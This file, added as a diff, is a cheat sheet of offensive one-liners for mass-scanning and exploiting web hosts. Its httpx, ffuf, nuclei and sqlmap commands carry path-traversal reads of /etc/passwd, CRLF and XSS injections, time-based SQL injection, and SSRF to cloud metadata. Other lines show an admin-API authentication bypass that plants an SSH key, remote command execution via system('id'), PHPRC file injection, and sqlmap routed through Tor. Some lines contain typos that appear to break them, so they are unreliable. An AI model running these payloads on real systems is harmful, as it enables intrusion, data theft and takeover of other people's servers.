@@ -1,0 +1,103 @@
+
+cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | httpx -silent -ms "You have an error in your SQL syntax"
+
+cat host.txt | httpx -path "/%E5%98%8D%E5%98%8ASetCookie:crlfinjection=crlfinjection" -mr "crlfinjection"  %E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=huzefa%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE 
+
+cat host.txt | httpx -H "Accept:../../../../../../../../etc/passwd{{" -t 50 -nc -silent -p 80,443,8080,8443,9000,9001,9003 -mr "root:x"
+
+cat host.txt | httpx -H "Accept:../../../../../../../../../../etc/passwd{{" -t 50 -nc -silent -p 80,443,8080,8443,9000,9001,9003 -mr "root:x"
+
+cat host.txt | httpx -silent -path '/api/index.php/v1/config/application?public=true' -mc 200
+
+cat host.txt | httpx -p 80,443,8080,8443,9000,9001,9003 -path "/assest////////////////../../../../../../../../etc/passwd" -t 50 -nc -silent  -mr "root:x"
+
+cat host.txt | httpx -p 80,443,8080,8088,8443,8808,8888,9000,9001,9002,9003 -path "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd" -t 50 -mr "root:x"
+
+cat host.txt | httpx -p 80,443,8080,8088,8443,8808,8888,9000,9001,9002,9003 -path "/.1..json" -mc 200
+
+cat host.txt | httpx -p 80,443,8080,8088,8443,8808,8888,9000,9001,9002,9003 -path "/env/loca.config.js" -mc 200
+
+cat host.txt | httpx -path "sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#" -mr 200
+
+cat host.txt | httpx -p 80,443,8080,8088,8443,8808,8888,9000,9001,9002,9003 -path "/.children..json" -mc 200,403,301,302
+
+cat host.txt | httpx -p 80,443,8080,8088,8443,8808,8888,9000,9001,9002,9003 -path "/servicedesk/customer/user" -mc 200
+
+cat host.txt | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc..%252fpasswd" -mr "root:x" -silent
+
+cat host.txt | httpx -nc -t 300 -p 80,443,8080,8088,8443,8808,8888,9000,9001,9002,9003 -path "/jenkins/script" -mc 200
+
+cat host.txt | httpx -nc -t 300 -p 80,443,8080,8088,8443,8808,8888,9000,9001,9002,9003 -path "/script" -mc 200
+
+cat host.txt | httpx -title -path "/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd" -match-string "root:x:0:0"
+
+cat host.txt | httpx -silent -path "/secure/QueryComponent!Default.jspa" --mc 200  -->CVE 2020-14179 unauthenticated jira vulnerability
+
+cat host_url.txt | uro | sed 's/=,*/=/' | nuclei -tags lfi
+
+cat host.txt | httpx -silent -path "/path/to/WWW/admin/desktop/excite/results.conf%2f" --mc 200
+
+cat host.txt | httpx -path "/wp-content/mysql.sql" -status-code -mc 200,403,301,302
+
+cat host.txt | httpx -path "/~sicom/mgrng/index.php" -status-code -mc 200,403,301,302
+
+cat host.txt | httpx -path "/Subscribe" -status-code -mc 200,403,301,302
+
+cat host.txt | httpx -path "/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/metadata" --> ssrf leads to metadata
+
+cat host.txt | httpx -path "/api/snapshots/:key" --silent --mc 200
+
+cat host.txt | httpx -path "/phpmyadmin/setup/index.php" -status-code -mc 200,403,301,302
+
+cat host.txt | httpx -path "/phpmyadmin/setup/" -status-code -mc 200,403,301,302
+
+cat host.txt | httpx -path "/phpMyAdmin/setup" -status-code -mc 200,403,301,302
+
+cat host.txt | httpx -path "/phpMyAdmin/setup/index.php" -status-code -mc 200,403,301,302
+
+cat host.txt | httpx -path "?link=http://evil.com" -status-code -mc 200,403,301,302
+
+cat host.txt | httpx -path "?configUrl=data:text/html;base64,ewoidXJsljoiaHR0cHM6Ly9leHVIZXJhbnQtaWNILnN1cmdILnNoL3Rlc3QueWFtbCIKfQ==" for outdated swaggerUI
+
+cat host.txt | httpx -path "/api/connector/swagger-ui/index.html?configUrl=data:text/html;base64,ewoidXJsljoiaHR0cHM6Ly9leHVIZXJhbnQtaWNILnN1cmdILnNoL3Rlc3QueWFtbCIKfQ==" for outdated swaggerUI
+
+cat host.txt | httpx -path "/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd" -mr "root:"
+
+ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -X PUT -H 'User-Agent:Report Runner' -H 'Content-Type:application/json' -H 'Forwarded:for='[127.0.0.1]:8000";by='[127.0.0.1]:9000";'-d '{"ssh-piblic-key1":"h4x0r"}' -mr "SSH" -random-agent
+
+cat host.txt | sudo httpx -path "/soap/ajax/20.0/debugshell.html" -mr "shell"
+
+cat host.txt | sudo httpx -path "/soap/ajax/20.0/debugshell.js" -mr "shell"
+
+cat host.txt | httpx -path "/api/index.php/v1/config/application?public=true" -mc 200
+
+cat host.txt | httpx -silent -path 'DebugConsole' -mc 200
+
+cat host.txt | httpx -path "/wp-login.php?redirect_to=htps://wwwsbfinance.com.ph/about-us/wp-admin/&wp_lang=en_USucilg%22%20accesskey%3dx%20onclick%3dalert(1)%2f%2f"
+
+cat host.txt | httpx -path "/api/v2/sso/jwt?error_url="><script>alert(1)</script>"
+
+cat host.txt | httpx -path "/axis2//axis2-web/HappyAxis.jsp" -mc 200
+
+cat host.txt | httpx -p 80,443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaa' -mc 400
+
+CVE 2022-36804  cat host.txt | httpx -follow-redirects -title -path /reps?visibility=piblic -match-string "repository-container" -threads 9500
+
+curl -s -d 'blowfish=1' -d "blowf=system('id');" 'https://domain.com/wp-json/am-memner/license'
+
+site:*example.com inurl:"*admin | login" | inurl: php | .asp
+
+site: target.com inurl:"contact" | inurl:"contact-us" | inurl:"contacus" | inurl:"contact_us" | inurl:"contact_form" | inurl:"contact-form"
+
+cat host.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
+
+findomain -t domain.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
+
+sqlmap -r 1 --time-sec=10 --tor --tor-type=SOCKS5 --check-tor  { if not work change time-sec or use proxy list }
+
+sqlmap -u "domain.com" -p parameter --level 5 --risk 3 --dbms="MySQL" --random-agent --test-filter="boolean-based blind" --current-user --hostname2
+
+sqlmap -u "target.com/sitemap.xml?offset=1" -p offset --level 5 --risk 3 --dbms=MySQL --hostname --test-filter="MySQL >= 5.0.12 stacked queries"
+
+curl -kv "https://target/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'
